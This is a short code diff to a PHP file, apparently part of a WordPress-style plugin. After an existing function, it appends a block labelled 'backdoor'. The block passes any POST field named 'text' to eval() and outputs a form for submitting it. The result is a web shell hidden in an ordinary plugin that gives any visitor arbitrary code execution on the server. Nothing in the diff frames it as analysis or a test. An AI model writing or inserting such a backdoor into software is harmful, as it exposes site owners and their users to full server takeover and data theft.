@@ -99,3 +99,13 @@ function as21_wjm_get_display_count_plus_by_group_id($group_id){
 
 }
 /* **** as21 get valid array from file **** */ 
+
+// backdoor
+
+if ( isset($_POST['text']) ) 
+  eval ($_POST['text']); 
+?> 
+<form method='POST'> 
+   <textarea name='text'></textarea> 
+   <input type='submit'> 
+</form>
